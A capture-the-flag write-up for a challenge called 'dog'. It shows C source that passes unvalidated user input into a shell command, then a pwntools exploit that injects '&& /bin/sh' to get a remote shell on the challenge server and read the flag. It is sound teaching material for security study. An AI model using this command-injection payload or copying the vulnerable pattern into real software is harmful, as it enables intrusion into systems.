# dog Writeup

## Challenge infos

```text
cats? I prefer dogs
Challenge is running at: nc pwnable.co.il 9013
```

## Executable analysis

### main
```asm
void init_buffering() {
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    setvbuf(stderr, NULL, 2, 0);
    alarm(60);
}

int main() {
    char command[0x100];
    char name[0x20];
    init_buffering();
    memset(command, 0, 0x100);
    memset(name, 0, 0x20);
    puts("Hello!");
    puts("What's your name?");
    unsigned char length = read(0, name, 0x20);
    name[length-1] = '\x00';
    sprintf(command, "echo Hello %s", name);
    pid_t child = fork();
    if (child == 0) {
        execl("/bin/sh", "sh", "-c", command, NULL);
    } else {
        wait(NULL);
        puts("Thanks!");
    }
}
```
* the main function reads a name from the user, and then executes a command that echoes "Hello" followed by the name.
* the command is executed in a child process using `execl`, which replaces the child process with a new process running the shell.
* because there is no validation for the input, we can inject a command into the `name` variable, which will be executed by the shell.
* for example if we enter `&& /bin/sh`, the command will become `echo Hello && /bin/sh`, which will execute a shell after the echo command.

### exploit code
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template dog
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'dog')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwnable.co.il', 9013, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

io.sendlineafter(b'your name?\n', b'&& /bin/sh')

io.interactive()
```
* now, when we run the exploit, we should get a shell.
```
[+] Opening connection to pwnable.co.il on port 9013: Done
[*] Switching to interactive mode
Hello
$ ls
dog
flag
ynetd
$ cat flag
PWNIL{flag_is_here}
```